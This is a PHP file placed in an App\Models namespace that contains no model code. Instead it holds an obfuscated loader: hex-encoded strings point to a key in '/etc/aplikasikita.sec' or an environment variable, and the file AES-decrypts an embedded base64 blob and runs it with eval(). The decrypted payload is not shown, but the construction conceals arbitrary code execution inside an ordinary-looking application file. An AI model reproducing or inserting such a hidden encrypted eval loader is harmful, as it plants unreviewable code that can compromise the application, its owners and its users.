<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iEFChMO4tS2vY6cEBy6VCg==');

$c=base64_decode(

'FgrMeoE/96kn+s41EH+ysFssgJRsxNixOwOfHHGLK4u6uDrJ2eF4QcsbO2dOfMYlpWLKpVcuuqd6' .
'E/mXkcZRUv+yCYEm3OQXLNH0oCSa9JzTJDT81EETZQdJ4ayWyG5FqsjIH3xIZgAwkhzE4ndpkRa8' .
'hj2F/Ix/l0rEikxrJULXBoesmW8CB/LI1C/aEaDfi/mJsLKEXcJVmSiJRbtG7NV4nDXkdv5Z/UwV' .
'3INII09p7c5KAQga7ZRoXVpOZM2qx+1AYyf8+W/VWaQLmbImZg2HjEcNsT6A6phyaRcs6Sy7V+uZ' .
'b2HXgjs7Bk79nH7Qec7YW/rSzOMPUlBDdGyUcdsu9k29rRQ/oSWMI+1qwfNrlTZCAC9tC9VXYMwO' .
'L37vKx7Zn7jP2/cZZnufRCGSwC8yCMhFOz/TnwiRwww5H+7OPhpAa5b2lo8f/1ojZ97Q15aqZ8EI' .
'0u4avwpc1B7qBEhVzH4ZQsqH40QaddhT01jYmeXJ+JPzbsuetUBLlQ6DyCvq3gpivtXbWJRKDZ3G' .
'56YDLus6NgXmW4isaLL4drBzTAVyYYREL074WyjLlPDq4OeaPEVokTLs+SxQqLctYPlxguDD6tVH' .
'wd9hqXJJEmGcufCD4QmWQn3ShcaDxnpTA25RLwj2MedMLy7IlY5F/85lV/1SqqWmwru5wllCWf4U' .
'BZE4UmOfzj3RENLBx16TC4flMP6w0nFv57O9PccAUvp25I61lt4a5+k3BIq3jRMadodxCkXLoXLQ' .
'4KBLWbGTi0BuWIFOQ4D8TzSzf1blEysynSJO42enwwLliSgBMoNgiOFa7b0jz/wDMhc/sv15EjrJ' .
'CVE027lTpf5Rx0qShZo+ASLE5ONc5N5VxSezLojeWxzEptvBM6ODr5IPD93uUlqnajAiUhUkdvFS' .
'2pee4w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

